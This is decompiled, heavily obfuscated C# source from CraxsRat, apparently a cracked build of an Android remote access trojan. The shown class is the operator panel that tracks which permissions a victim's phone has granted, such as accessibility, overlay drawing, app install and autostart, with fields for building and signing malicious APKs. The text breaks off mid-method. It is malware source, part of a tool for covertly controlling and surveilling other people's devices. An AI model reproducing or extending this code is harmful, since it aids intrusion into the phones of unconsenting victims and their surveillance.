// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.PermissionsManager
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Craxs_Rat.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class PermissionsManager : Form
  {
    public bool need_syswinow;
    public bool need_boot;
    public bool need_all;
    public bool ASKPRIM_all;
    public bool Once;
    public bool HoldMainThread;
    private Process cmdProcess;
    public string WorkingDir;
    private bool FoundJava;
    private string apktemp;
    private string apktoolpath;
    private string Apksignerpath;
    private string ApkZIPpath;
    private string outputapk;
    private string originalapkname;
    private string Apkeditorpath;
    private bool protectfinished;
    public Random rshit;
    public int cou3;
    public static int WM_NCLBUTTONDOWN;
    public static int HT_CAPTION;
    [SpecialName]
    private Random \u0024STATIC\u0024RandomShit\u00242021C88\u0024r;
    [SpecialName]
    private StaticLocalInitFlag \u0024STATIC\u0024RandomShit\u00242021C88\u0024r\u0024Init;
    [SpecialName]
    private Random \u0024STATIC\u0024GenerateRandomNumber\u0024202888\u0024Random_Number;
    [SpecialName]
    private StaticLocalInitFlag \u0024STATIC\u0024GenerateRandomNumber\u0024202888\u0024Random_Number\u0024Init;
    [SpecialName]
    private Random \u0024STATIC\u0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq\u00242021C88\u0024r;
    [SpecialName]
    private StaticLocalInitFlag \u0024STATIC\u0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq\u00242021C88\u0024r\u0024Init;
    public string \u0024VB\u0024Local_msg;
    public Jector \u0024VB\u0024Me;
    public Exception \u0024VB\u0024Local_ex;
    public Jector \u0024VB\u0024Me;
    private IContainer components;

    internal virtual DrakeUITabControl DrakeUITabControl1
    {
      get => ((ScreenReaderV2) this)._DrakeUITabControl1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((ScreenReaderV2) this)._DrakeUITabControl1 = value;
      }
    }

    internal virtual TabPage TabPage1
    {
      get => ((ScreenReaderV2) this)._TabPage1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ScreenReaderV2) this)._TabPage1 = value;
    }

    internal virtual TabPage TabPage2
    {
      get => ((ScreenReaderV2) this)._TabPage2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ScreenReaderV2) this)._TabPage2 = value;
    }

    internal virtual DataGridView DGVPRIM
    {
      get => ((ScreenReaderV2) this)._DGVPRIM;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ScreenReaderV2) this)._DGVPRIM = value;
    }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon3
    {
      get => ((ScreenReaderV2) this)._DrakeUIButtonIcon3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon3_Click);
label_1:
        int num1 = -205722117;
        DrakeUIButtonIcon drakeUiButtonIcon3;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -~(~-num1 ^ -(-1241618569 * 635101049) ^ -(230538665 ^ 1720470530))) % 8U)
          {
            case 0:
              goto label_1;
            case 1:
              ((ScreenReaderV2) this)._DrakeUIButtonIcon3 = value;
              num1 = -1161884662;
              continue;
            case 2:
              int num3 = drakeUiButtonIcon3 == null ? 1943723017 : (num3 = 2025498661);
              num1 = num3 ^ (int) num2 * 1356622230;
              continue;
            case 3:
              drakeUiButtonIcon3.Click += eventHandler;
              num1 = (int) num2 * 1727580212 ^ -2042872404;
              continue;
            case 4:
              goto label_3;
            case 5:
              drakeUiButtonIcon3.Click -= eventHandler;
              num1 = (int) num2 * -897960734 ^ -41557537;
              continue;
            case 6:
              drakeUiButtonIcon3 = ((ScreenReaderV2) this)._DrakeUIButtonIcon3;
              int num4 = drakeUiButtonIcon3 == null ? 1262434014 : (num4 = 1104159081);
              num1 = num4 ^ (int) num2 * 1709181049;
              continue;
            case 7:
              drakeUiButtonIcon3 = ((ScreenReaderV2) this)._DrakeUIButtonIcon3;
              num1 = (int) num2 * -1865089295 ^ -1536811463;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Panel Panel1
    {
      get => ((ScreenReaderV2) this)._Panel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        PaintEventHandler paintEventHandler = new PaintEventHandler(this.Panel1_Paint);
label_1:
        int num1 = 132192670;
        Panel panel1;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-num1 - ~~((-212729587 ^ 1016410806) * 898030981) + ~(682995072 + ~757679120) ^ 371119897 ^ 1523229571)) % 9U)
          {
            case 0:
              int num3 = panel1 == null ? 1263724851 : (num3 = -1891880346);
              num1 = num3 ^ (int) num2 * 458046388;
              continue;
            case 1:
              panel1 = ((ScreenReaderV2) this)._Panel1;
              num1 = (int) num2 * 1697789189 ^ -1983814002;
              continue;
            case 2:
              goto label_1;
            case 3:
              goto label_3;
            case 4:
              ((ScreenReaderV2) this)._Panel1 = value;
              num1 = 156404652;
              continue;
            case 5:
              panel1.Paint += paintEventHandler;
              num1 = (int) num2 * -1068633033 ^ -1796928724;
              continue;
            case 6:
              int num4 = panel1 == null ? 538620225 : (num4 = -332876948);
              num1 = num4 ^ (int) num2 * -1551415787;
              continue;
            case 7:
              panel1.Paint -= paintEventHandler;
              num1 = (int) num2 * 1642310524 ^ -502562821;
              continue;
            case 8:
              panel1 = ((ScreenReaderV2) this)._Panel1;
              num1 = (int) num2 * -1087039165 ^ 396260342;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual Label Label2
    {
      get => ((ScreenReaderV2) this)._Label2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ScreenReaderV2) this)._Label2 = value;
    }

    internal virtual Label Label1
    {
      get => ((ScreenReaderV2) this)._Label1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ScreenReaderV2) this)._Label1 = value;
    }

    internal virtual DrakeUIComboBox comboproms
    {
      get => ((ScreenReaderV2) this)._comboproms;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((ScreenReaderV2) this)._comboproms = value;
      }
    }

    internal virtual Button addactiv
    {
      get => ((ScreenReaderV2) this)._addactiv;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Addactiv_Click);
        Button addactiv = ((ScreenReaderV2) this)._addactiv;
label_1:
        int num1 = 1505854552;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-(num1 * -819760381 * 1058262397 * 948063263 + 1790140615 * (735617213 + 1679863975)) - 1622363483)) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              ((ScreenReaderV2) this)._addactiv = value;
              addactiv = ((ScreenReaderV2) this)._addactiv;
              num1 = -530898775;
              continue;
            case 2:
              addactiv.Click += eventHandler;
              num1 = (int) num2 * 748079945 ^ 2057176909;
              continue;
            case 3:
              int num3 = addactiv == null ? -562704819 : (num3 = -36577039);
              num1 = num3 ^ (int) num2 * 1281687451;
              continue;
            case 4:
              goto label_3;
            case 5:
              addactiv.Click -= eventHandler;
              num1 = (int) num2 * 1467300322 ^ -543651742;
              continue;
            case 6:
              int num4 = addactiv == null ? 1149284775 : (num4 = 1333551753);
              num1 = num4 ^ (int) num2 * 2125397915;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual Button Button1
    {
      get => ((ScreenReaderV2) this)._Button1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button1_Click);
        Button button1 = ((ScreenReaderV2) this)._Button1;
        if (button1 == null)
          goto label_6;
label_1:
        int num1 = 965797717;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~-((num1 - -~((-120189136 - -1507156961) * 239571209 * -1156518901)) * 51061405 * 834418001) - 398318367)) % 6U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              button1.Click += eventHandler;
              num1 = (int) num2 * 1191108842 ^ 1260912383;
              continue;
            case 3:
              button1.Click -= eventHandler;
              num1 = (int) num2 * -466214643 ^ 2023477354;
              continue;
            case 4:
              int num3 = button1 == null ? -1754431697 : (num3 = 875239252);
              num1 = num3 ^ (int) num2 * 1091826711;
              continue;
            case 5:
              goto label_6;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:
        return;
label_6:
        ((ScreenReaderV2) this)._Button1 = value;
        button1 = ((ScreenReaderV2) this)._Button1;
        num1 = -179529148;
        goto label_2;
      }
    }

    internal virtual DrakeUIListBox Primslist
    {
      get => ((ScreenReaderV2) this)._Primslist;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((ScreenReaderV2) this)._Primslist = value;
      }
    }

    internal virtual Label Label3
    {
      get => ((ScreenReaderV2) this)._Label3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ScreenReaderV2) this)._Label3 = value;
    }

    internal virtual Panel Panel2
    {
      get => ((ScreenReaderV2) this)._Panel2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ScreenReaderV2) this)._Panel2 = value;
    }

    internal virtual Label statustext
    {
      get => ((ScreenReaderV2) this)._statustext;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((ScreenReaderV2) this)._statustext = value;
      }
    }

    internal virtual Button Button2
    {
      get => ((ScreenReaderV2) this)._Button2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button2_Click);
label_1:
        int num1 = -699693355;
        Button button2;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~~(~-(num1 ^ (1506808585 ^ -312621342 ^ -1831866126 - 1604963577) + (1645066593 * 1071997815 ^ 94253382) + ~(1067473440 - 430516852 + 1199695740) - ~(~1485410559 + (1823331707 ^ 1021683072) ^ -519317241 - 532052336 + ~-1886288456)) * -1217779979)) % 9U)
          {
            case 0:
              button2.Click += eventHandler;
              num1 = (int) num2 * -879385748 ^ -596033766;
              continue;
            case 1:
              button2 = ((ScreenReaderV2) this)._Button2;
              num1 = (int) num2 * 973819169 ^ 1073187805;
              continue;
            case 2:
              ((ScreenReaderV2) this)._Button2 = value;
              num1 = -876291014;
              continue;
            case 3:
              button2 = ((ScreenReaderV2) this)._Button2;
              num1 = (int) num2 * -551738116 ^ 106565154;
              continue;
            case 4:
              button2.Click -= eventHandler;
              num1 = (int) num2 * 44366359 ^ 1196562266;
              continue;
            case 5:
              int num3 = button2 == null ? -92199749 : (num3 = -1944862552);
              num1 = num3 ^ (int) num2 * -1714976978;
              continue;
            case 6:
              int num4 = button2 == null ? 1635971565 : (num4 = -921527264);
              num1 = num4 ^ (int) num2 * -633411507;
              continue;
            case 7:
              goto label_1;
            case 8:
              goto label_3;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual DrakeUIToolTip DrakeUIToolTip1
    {
      get => ((ScreenReaderV2) this)._DrakeUIToolTip1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((ScreenReaderV2) this)._DrakeUIToolTip1 = value;
      }
    }

    internal virtual DataGridViewImageColumn iconprim
    {
      get => ((ScreenReaderV2) this)._iconprim;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ScreenReaderV2) this)._iconprim = value;
    }

    internal virtual DataGridViewTextBoxColumn primname
    {
      get => ((ScreenReaderV2) this)._primname;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ScreenReaderV2) this)._primname = value;
    }

    internal virtual DataGridViewTextBoxColumn Status
    {
      get => ((ScreenReaderV2) this)._Status;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ScreenReaderV2) this)._Status = value;
    }

    internal virtual TabPage TabPage3
    {
      get => ((ScreenReaderV2) this)._TabPage3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ScreenReaderV2) this)._TabPage3 = value;
    }

    internal virtual PictureBox PictureBox2
    {
      get => ((ScreenReaderV2) this)._PictureBox2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((ScreenReaderV2) this)._PictureBox2 = value;
      }
    }

    internal virtual Label Label5
    {
      get => ((ScreenReaderV2) this)._Label5;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ScreenReaderV2) this)._Label5 = value;
    }

    internal virtual PictureBox PictureBox1
    {
      get => ((ScreenReaderV2) this)._PictureBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((ScreenReaderV2) this)._PictureBox1 = value;
      }
    }

    internal virtual Label Label4
    {
      get => ((ScreenReaderV2) this)._Label4;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ScreenReaderV2) this)._Label4 = value;
    }

    internal virtual TextBox TextBox1
    {
      get => ((ScreenReaderV2) this)._TextBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ScreenReaderV2) this)._TextBox1 = value;
    }

    internal virtual DrakeUICheckBox checkbattery
    {
      get => ((ScreenShoter) this)._checkbattery;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        MouseEventHandler mouseEventHandler = new MouseEventHandler(this.checkbattery_MouseClick);
label_1:
        int num1 = 762065406;
        DrakeUICheckBox checkbattery;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-(num1 + (-(~-1005558543 + (-927708426 - 1200243493)) - -1790151823 * ~(448921772 ^ -2011753959) + ~(~1416364934 - 660014971) * -1890159901) - (-(-1218615403 - -518433837) + ~(-1942991051 * 403900385) - 99096290 * 1420231375)) - ((1045836758 ^ 1961003746) - (1476956028 - -976179146)))) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              checkbattery = ((ScreenShoter) this)._checkbattery;
              int num3 = checkbattery == null ? -174295641 : (num3 = 367164431);
              num1 = num3 ^ (int) num2 * 50211211;
              continue;
            case 2:
              goto label_3;
            case 3:
              checkbattery.MouseClick += mouseEventHandler;
              num1 = (int) num2 * 1348847525 ^ -1452738710;
              continue;
            case 4:
              ((ScreenShoter) this)._checkbattery = value;
              num1 = 1014382699;
              continue;
            case 5:
              checkbattery = ((ScreenShoter) this)._checkbattery;
              int num4 = checkbattery == null ? 1465209176 : (num4 = -1648432023);
              num1 = num4 ^ (int) num2 * -256993214;
              continue;
            case 6:
              checkbattery.MouseClick -= mouseEventHandler;
              num1 = (int) num2 * 1729849402 ^ -6320598;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual DrakeUICheckBox checkdraw
    {
      get => ((ScreenShoter) this)._checkdraw;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        MouseEventHandler mouseEventHandler = new MouseEventHandler(this.Checkdraw_MouseClick);
label_1:
        int num1 = -1336651760;
        DrakeUICheckBox checkdraw;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~-(num1 ^ ~(~(1538119670 - 1822538741) + ~1886389357) * 386420547 ^ 2057172773 - (-1592916546 ^ -2026938368) - (970336521 - 181997402 - 388059627) + ((125959966 ^ -419321438) + --1206185776 + ---189190634)) - (-35436109 - 66557325) + 1905254558)) % 8U)
          {
            case 0:
              checkdraw = ((ScreenShoter) this)._checkdraw;
              int num3 = checkdraw == null ? 1652355315 : (num3 = -1869087326);
              num1 = num3 ^ (int) num2 * -133935700;
              continue;
            case 1:
              checkdraw.MouseClick += mouseEventHandler;
              num1 = (int) num2 * 2147239547 ^ -1765741944;
              continue;
            case 2:
              goto label_3;
            case 3:
              ((ScreenShoter) this)._checkdraw = value;
              num1 = 466620729;
              continue;
            case 4:
              checkdraw.MouseClick -= mouseEventHandler;
              num1 = (int) num2 * -1601198542 ^ 765719404;
              continue;
            case 5:
              goto label_1;
            case 6:
              int num4 = checkdraw == null ? 1122210250 : (num4 = 1690953907);
              num1 = num4 ^ (int) num2 * -160134523;
              continue;
            case 7:
              checkdraw = ((ScreenShoter) this)._checkdraw;
              num1 = (int) num2 * -389375302 ^ 1050305921;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual DrakeUICheckBox checkacess
    {
      get => ((ScreenShoter) this)._checkacess;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        MouseEventHandler mouseEventHandler = new MouseEventHandler(this.Checkacess_MouseClick);
label_1:
        int num1 = -10359853;
        while (true)
        {
          int num2 = num1;
          uint num3;
          DrakeUICheckBox checkacess;
          switch ((num3 = (uint) (-(--(986356334 - 620346856 + (1091594381 - 466448957)) - -(~(-233738969 ^ -663338031) + (-646389887 * 1650789328 ^ 1339693393 - 274182435)) - num2) - --(586704607 + 1204350980))) % 7U)
          {
            case 0:
              checkacess.MouseClick -= mouseEventHandler;
              num1 = (int) num3 * -1665827476 ^ 568749494;
              continue;
            case 1:
              ((ScreenShoter) this)._checkacess = value;
              checkacess = ((ScreenShoter) this)._checkacess;
              num1 = -80326436;
              continue;
            case 2:
              goto label_3;
            case 3:
              int num4 = checkacess == null ? -1872296200 : (num4 = -1897520532);
              num1 = num4 ^ (int) num3 * 1076001722;
              continue;
            case 4:
              checkacess = ((ScreenShoter) this)._checkacess;
              int num5 = checkacess == null ? -665882933 : (num5 = 1013130259);
              num1 = num5 ^ (int) num3 * -1728841129;
              continue;
            case 5:
              goto label_1;
            case 6:
              checkacess.MouseClick += mouseEventHandler;
              num1 = (int) num3 * -1320473817 ^ 943928332;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual DrakeUICheckBox Checkbg
    {
      get => ((ScreenShoter) this)._Checkbg;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        MouseEventHandler mouseEventHandler = new MouseEventHandler(this.Checkbg_MouseClick);
        DrakeUICheckBox checkbg = ((ScreenShoter) this)._Checkbg;
label_1:
        int num1 = 1729107924;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~((~num1 - (-1758222086 ^ ~(1647272329 + (1399294318 ^ 1360451063)))) * 151792981)) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              int num3 = checkbg == null ? -941253421 : (num3 = -2032468789);
              num1 = num3 ^ (int) num2 * -1684241937;
              continue;
            case 2:
              checkbg.MouseClick += mouseEventHandler;
              num1 = (int) num2 * 248614490 ^ -1017153256;
              continue;
            case 3:
              checkbg.MouseClick -= mouseEventHandler;
              num1 = (int) num2 * -1295457848 ^ 2046272094;
              continue;
            case 4:
              goto label_3;
            case 5:
              int num4 = checkbg == null ? 2041085868 : (num4 = -280421493);
              num1 = num4 ^ (int) num2 * -74899428;
              continue;
            case 6:
              ((ScreenShoter) this)._Checkbg = value;
              checkbg = ((ScreenShoter) this)._Checkbg;
              num1 = 1227168947;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual DrakeUICheckBox checkautostart
    {
      get => ((ScreenShoter) this)._checkautostart;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        MouseEventHandler mouseEventHandler = new MouseEventHandler(this.Toggle2_MouseClick);
        DrakeUICheckBox checkautostart = ((ScreenShoter) this)._checkautostart;
label_1:
        int num1 = -583520012;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~(-(-num1 + (589179445 * (198441072 - -1277700141) + -(1177385125 - 435403057) + -(-1231220073 * 191679140))) - ~-846679216) - 1570302448)) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              int num3 = checkautostart == null ? -1266628934 : (num3 = 1281546836);
              num1 = num3 ^ (int) num2 * -1193808472;
              continue;
            case 2:
              goto label_3;
            case 3:
              checkautostart.MouseClick -= mouseEventHandler;
              num1 = (int) num2 * 1358882421 ^ -41341955;
              continue;
            case 4:
              checkautostart = ((ScreenShoter) this)._checkautostart;
              int num4 = checkautostart == null ? -1611816925 : (num4 = 463084725);
              num1 = num4 ^ (int) num2 * -1061489705;
              continue;
            case 5:
              checkautostart.MouseClick += mouseEventHandler;
              num1 = (int) num2 * -309421777 ^ -1470514473;
              continue;
            case 6:
              ((ScreenShoter) this)._checkautostart = value;
              num1 = 1102556020;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual DrakeUICheckBox checkinstall
    {
      get => ((ScreenShoter) this)._checkinstall;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        MouseEventHandler mouseEventHandler = new MouseEventHandler(this.DrakeUICheckBox1_MouseClick);
        DrakeUICheckBox checkinstall = ((ScreenShoter) this)._checkinstall;
        if (checkinstall == null)
          goto label_6;
label_1:
        int num1 = -1608870535;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-~~(num1 - ((-(-2020727457 ^ -732928279) - (1537868834 + 1998146899 ^ 2081833645 - 1505598256) ^ --1601914909 * -1651338217 + -1620507712 * 238366475) + (~~2114835235 + ~2126966795 + (-2110316354 - (1466933097 ^ 417649204 ^ 1774920447 + 674112409)))) - -(-1205914651 + (-1642785676 ^ 1184096567) ^ -(1923095587 - 787312641))) - 484782670)) % 6U)
          {
            case 0:
              goto label_1;
            case 1:
              checkinstall.MouseClick += mouseEventHandler;
              num1 = (int) num2 * 170720382 ^ 2144379823;
              continue;
            case 2:
              checkinstall.MouseClick -= mouseEventHandler;
              num1 = (int) num2 * -710456818 ^ 246902696;
              continue;
            case 3:
              goto label_6;
            case 4:
              goto label_3;
            case 5:
              checkinstall = ((ScreenShoter) this)._checkinstall;
              int num3 = checkinstall == null ? 445861083 : (num3 = -1162894902);
              num1 = num3 ^ (int) num2 * 1194346582;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:
        return;
label_6:
        ((ScreenShoter) this)._checkinstall = value;
        num1 = -1134746422;
        goto label_2;
      }
    }

    internal virtual Label Label6
    {
      get => ((ScreenShoter) this)._Label6;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ScreenShoter) this)._Label6 = value;
    }

    internal virtual Panel Panel3
    {
      get => ((ScreenShoter) this)._Panel3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ScreenShoter) this)._Panel3 = value;
    }

    internal virtual Label clinameinfo
    {
      get => ((ScreenShoter) this)._clinameinfo;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((ScreenShoter) this)._clinameinfo = value;
      }
    }

    internal virtual PictureBox ClientPic
    {
      get => ((ScreenShoter) this)._ClientPic;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ScreenShoter) this)._ClientPic = value;
    }

    public PermissionsManager()
    {
label_1:
      int num1 = 1349363678;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ((958670648 ^ -2138056252 ^ --225171476) - -~(num2 - ((-(-509985140 ^ 1308293039) ^ 1645744081 - -352328284 ^ -311373051) - 359880197 ^ -1456767827 * 1396690347)) + (858130126 ^ 478139866) - -1538903369)) % 6U)
        {
          case 0:
            ((ScreenShoter) this).install_prog = false;
            ((ScreenShoter) this).battary_prog = false;
            num1 = (int) num3 * -1752741251 ^ 1976486798;
            continue;
          case 1:
            this.Load += new EventHandler(this.PermissionsManager_Load);
            ((ScreenShoter) this).Acces_prog = false;
            num1 = (int) num3 * 1009065438 ^ -905128888;
            continue;
          case 2:
            goto label_3;
          case 3:
            ((ScreenShoter) this).draw_prog = false;
            num1 = (int) num3 * -1496520396 ^ 1465104397;
            continue;
          case 4:
            goto label_1;
          case 5:
            ((NotificationMaker) this).InitializeComponent();
            num1 = (int) num3 * 66185343 ^ 1574292996;
            continue;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:;
    }

    public void UpdatePrims(object[] obj)
    {
      if (!this.DGVPRIM.InvokeRequired)
        goto label_7;
label_1:
      int num1 = 1860592588;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~(((num1 * -827798535 ^ -(-1538016495 * (-404337621 ^ -767356227 ^ -1791271778))) + (~(116780344 + 1909033209) - 615746722) ^ ~(2129120105 * -1166616502)) * 1459703133)) % 6U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_12;
          case 2:
            goto label_7;
          case 3:
            this.DGVPRIM.Rows.Clear();
            num1 = (int) num2 * 735715503 ^ 782400416;
            continue;
          case 4:
            // ISSUE: method pointer
            this.DGVPRIM.Invoke((Delegate) new PermissionsManager((object) this, __methodptr(UpdatePrims)), (object) obj);
            num1 = (int) num2 * 440917283 ^ -258268473;
            continue;
          default:
            goto label_8;
        }
      }
label_12:
      return;
label_8:
      Bitmap bitmap1 = (Bitmap) Codes.ResizeImage((Image) Craxs_Rat.My.Resources.Resources.correctsign, new Size(45, 45));
      Bitmap bitmap2 = (Bitmap) Codes.ResizeImage((Image) Craxs_Rat.My.Resources.Resources.X_sign, new Size(45, 45));
      string[] strArray;
      try
      {
        if (Operators.CompareString(strArray[0], EXGuarder.\u0037148401E, false) != 0)
          goto label_32;
label_10:
        int num3 = 49687957;
label_11:
        int index1;
        int index2;
        int index3;
        int index4;
        int index5;
        int index6;
        int index7;
        int index8;
        int index9;
        int index10;
        int index11;
        int index12;
        int index13;
        int index14;
        int index15;
        int index16;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) ~(((num3 * -827798535 ^ -(-1538016495 * (-404337621 ^ -767356227 ^ -1791271778))) + (~(116780344 + 1909033209) - 615746722) ^ ~(2129120105 * -1166616502)) * 1459703133)) % 84U)
          {
            case 0:
              this.checkacess.Enabled = false;
              num3 = (int) num4 * 1780886549 ^ -994695656;
              continue;
            case 1:
              this.DGVPRIM.Rows[this.DGVPRIM.Rows.Add((object) bitmap2, (object) EXGuarder.\u0030A1F4873, (object) EXGuarder.\u0032A646134)].Cells[2].Style.ForeColor = Color.Red;
              num3 = -194676958;
              continue;
            case 2:
              int num5;
              num3 = num5 = Operators.CompareString(strArray[1], EXGuarder.\u0037148401E, false) != 0 ? 395460726 : (num5 = -1178178049);
              continue;
            case 3:
              index13 = this.DGVPRIM.Rows.Add((object) bitmap1, (object) EXGuarder.\u00355115A38, (object) EXGuarder.\u0033F2D644B);
              num3 = (int) num4 * 1085524897 ^ -495858139;
              continue;
            case 4:
              num3 = (int) num4 * -1811989025 ^ 1552491428;
              continue;
            case 5:
              index4 = this.DGVPRIM.Rows.Add((object) bitmap2, (object) EXGuarder.\u0030D6A4B78, (object) EXGuarder.\u0032A646134);
              num3 = 951063439;
              continue;
            case 6:
              int num6;
              num3 = num6 = Operators.CompareString(strArray[5], EXGuarder.\u0037148401E, false) != 0 ? -1784900385 : (num6 = -1880966422);
              continue;
            case 7:
              index11 = this.DGVPRIM.Rows.Add((object) bitmap1, (object) EXGuarder.\u003675E0645, (object) EXGuarder.\u0033F2D644B);
              num3 = (int) num4 * -1651552581 ^ 1195898831;
              continue;
            case 8:
              num3 = (int) num4 * -1878281256 ^ 441134353;
              continue;
            case 9:
              this.DGVPRIM.Rows[index3].Cells[2].Style.ForeColor = Color.Red;
              num3 = (int) num4 * -723668620 ^ -1881100219;
              continue;
            case 10:
              this.DGVPRIM.Rows[index10].Cells[2].Style.ForeColor = Color.Red;
              ((ScreenShoter) this).Acces_prog = true;
              num3 = (int) num4 * -916770851 ^ 1865165078;
              continue;
            case 11:
              this.checkdraw.Checked = true;
              this.checkdraw.Enabled = false;
              num3 = (int) num4 * 1272379808 ^ -247617535;
              continue;
            case 12:
              int num7;
              num3 = num7 = Operators.CompareString(strArray[6], EXGuarder.\u0037148401E, false) != 0 ? 1983208518 : (num7 = -755962907);
              continue;
            case 13:
              this.DGVPRIM.Rows[index8].Cells[2].Style.ForeColor = Color.Red;
              num3 = (int) num4 * -1487857898 ^ -1385223354;
              continue;
            case 14:
              this.DGVPRIM.Rows[index2].Cells[2].Style.ForeColor = Color.Lime;
              num3 = (int) num4 * -803744861 ^ 628482743;
              continue;
            case 15:
              this.DGVPRIM.Rows[this.DGVPRIM.Rows.Add((object) bitmap2, (object) EXGuarder.\u0032C396B67, (object) EXGuarder.\u0032A646134)].Cells[2].Style.ForeColor = Color.Red;
              ((ScreenShoter) this).install_prog = true;
              num3 = -1077254980;
              continue;
            case 16:
              index14 = this.DGVPRIM.Rows.Add((object) bitmap2, (object) EXGuarder.\u00310593A1F, (object) EXGuarder.\u0032A646134);
              num3 = 1035598537;
              continue;
            case 17:
              this.DGVPRIM.Rows[index9].Cells[2].Style.ForeColor = Color.Lime;
              num3 = (int) num4 * 461262829 ^ -119723552;
              continue;
            case 18:
              this.DGVPRIM.Rows[this.DGVPRIM.Rows.Add((object) bitmap1, (object) EXGuarder.\u0032A631915, (object) EXGuarder.\u0033F2D644B)].Cells[2].Style.ForeColor = Color.Lime;
              num3 = (int) num4 * 2020897187 ^ -825770379;
              continue;
            case 19:
              index9 = this.DGVPRIM.Rows.Add((object) bitmap1, (object) EXGuarder.\u0031F255F4E, (object) EXGuarder.\u0033F2D644B);
              num3 = (int) num4 * -1143008117 ^ 1735586562;
              continue;
            case 20:
              this.DGVPRIM.Rows[this.DGVPRIM.Rows.Add((object) bitmap2, (object) EXGuarder.\u0032D256C13, (object) EXGuarder.\u0032A646134)].Cells[2].Style.ForeColor = Color.Red;
              num3 = -1156374772;
              continue;
            case 21:
